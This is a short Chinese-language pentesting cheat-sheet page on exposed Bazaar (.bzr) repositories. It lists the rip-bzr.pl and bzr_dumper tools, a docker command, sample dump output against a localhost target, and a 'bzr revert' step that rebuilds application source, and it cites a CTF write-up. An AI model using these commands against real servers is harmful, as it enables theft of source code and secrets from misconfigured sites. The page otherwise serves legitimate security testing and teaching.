# Bazaar

> Bazaar（也称为bzr）是一款免费的分布式版本控制系统（DVCS），它帮助你在时间推移中追踪项目历史并与其他开发者无缝协作。由Canonical开发，Bazaar强调易用性、灵活的工作流以及丰富的功能，以满足个人开发者和大型团队的需求。

## 概述

* [工具](#工具)
    * [rip-bzr.pl](#rip-bzrpl)
    * [bzr_dumper](#bzr_dumper)
* [参考文献](#参考文献)

## 工具

### rip-bzr.pl

* [kost/dvcs-ripper/rip-bzr.pl](https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl)

    ```powershell
    docker run --rm -it -v /路径/到/主机/工作目录:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
    ```

### bzr_dumper

* [SeahunOh/bzr_dumper](https://github.com/SeahunOh/bzr_dumper)

```powershell
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
创建了一个独立的树（格式：2a）
[!] 目标 : http://127.0.0.1:5000/
[+] 开始。
[+] GET repository/pack-names
[+] GET README
[+] GET checkout/dirstate
[+] GET checkout/views
[+] GET branch/branch.conf
[+] GET branch/format
[+] GET branch/last-revision
[+] GET branch/tag
[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] 完成
```

```powershell
bzr revert
 N  application.py
 N  database.py
 N  static/
```

## 参考文献

* [STEM CTF网络安全挑战2019 – 我的第一个博客 - m3ssap0 / zuzzur3ll0n1 - 2019年3月2日](https://ctftime.org/writeup/13380)